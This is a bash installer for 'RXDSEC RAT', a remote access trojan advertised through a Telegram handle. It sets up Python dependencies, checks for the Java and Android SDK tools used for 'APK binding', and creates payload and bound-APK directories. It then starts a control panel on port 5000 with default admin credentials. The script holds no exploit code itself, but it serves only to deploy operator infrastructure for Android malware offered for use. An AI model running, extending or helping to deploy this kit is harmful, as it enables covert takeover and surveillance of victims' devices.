#!/bin/bash

# RXDSEC RAT Dependencies Installation Script
# This script will install all required dependencies for RXDSEC RAT

echo "==============================================================="
echo "  RXDSEC RAT Dependencies Installation"
echo "  Created by @Rxdsec (https://t.me/rxdsec)"
echo "==============================================================="
echo

# Check if running as root (required for some installations)
if [ "$EUID" -ne 0 ]; then
  echo "[!] Please run as root (sudo) for complete installation"
  # Continue anyway but warn
  echo "[*] Continuing without root privileges (some features may not install properly)"
  echo
fi

# Function to check if a command exists
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

# Check for Python 3.11+
echo "[*] Checking Python version..."
if command_exists python3; then
  PYTHON_VERSION=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
  PYTHON_MAJOR=$(echo $PYTHON_VERSION | cut -d. -f1)
  PYTHON_MINOR=$(echo $PYTHON_VERSION | cut -d. -f2)
  
  if [ "$PYTHON_MAJOR" -lt 3 ] || ([ "$PYTHON_MAJOR" -eq 3 ] && [ "$PYTHON_MINOR" -lt 11 ]); then
    echo "[!] Python 3.11+ is required (found $PYTHON_VERSION)"
    echo "[*] Please install Python 3.11 or higher"
    exit 1
  else
    echo "[+] Python $PYTHON_VERSION detected"
  fi
else
  echo "[!] Python 3 not found"
  echo "[*] Please install Python 3.11 or higher"
  exit 1
fi

# Create a virtual environment (optional)
echo "[*] Setting up a virtual environment..."
if command_exists python3; then
  if [ -d "venv" ]; then
    echo "[*] Virtual environment already exists"
  else
    python3 -m venv venv
    echo "[+] Virtual environment created"
  fi
  
  # Activate virtual environment
  echo "[*] Activating virtual environment..."
  source venv/bin/activate
  echo "[+] Virtual environment activated"
else
  echo "[!] Failed to create virtual environment"
  echo "[*] Continuing with system Python..."
fi

# Install Python dependencies
echo "[*] Installing Python dependencies..."
if [ -f "docs/requirements_full.txt" ]; then
  pip install -r docs/requirements_full.txt
  echo "[+] Python dependencies installed"
else
  echo "[!] requirements_full.txt not found"
  echo "[*] Please make sure the file exists in the docs directory"
  exit 1
fi

# Check for external dependencies
echo "[*] Checking external dependencies..."

# Java JDK
echo "[*] Checking for Java JDK..."
if command_exists java; then
  JAVA_VERSION=$(java -version 2>&1 | awk -F '"' '/version/ {print $2}')
  echo "[+] Java $JAVA_VERSION detected"
else
  echo "[!] Java JDK not found (required for APK binding)"
  echo "[*] Install using: sudo apt install openjdk-11-jdk (Ubuntu/Debian)"
fi

# Android SDK tools for APK manipulation
echo "[*] Checking for Android SDK tools..."
if command_exists zipalign; then
  echo "[+] zipalign detected"
else
  echo "[!] Android SDK build tools not found (required for APK manipulation)"
  echo "[*] Install Android SDK or use the bundled tools"
fi

# Database setup
echo "[*] Setting up database..."
if [ -f "init_db.py" ]; then
  python init_db.py
  echo "[+] Database initialized"
else
  echo "[!] Database initialization script not found"
  echo "[*] You may need to manually initialize the database"
fi

# Create necessary directories
echo "[*] Creating necessary directories..."
mkdir -p data
mkdir -p data/uploads
mkdir -p data/payloads
mkdir -p data/bound_apks
echo "[+] Directories created"

# Set proper permissions
echo "[*] Setting file permissions..."
chmod +x *.py
echo "[+] Permissions set"

echo
echo "==============================================================="
echo "  Installation Summary"
echo "==============================================================="
echo "[+] Python dependencies installed"
echo "[+] Directories created"
echo "[+] Permissions set"
echo
echo "To start the server, run:"
echo "  source venv/bin/activate  # If using virtual environment"
echo "  python main.py"
echo
echo "Or for production deployments:"
echo "  gunicorn --bind 0.0.0.0:5000 --workers 4 main:app"
echo
echo "Visit http://localhost:5000 to access the control panel"
echo "Default credentials: admin / adminpassword"
echo
echo "IMPORTANT: Change the default password after first login!"
echo "==============================================================="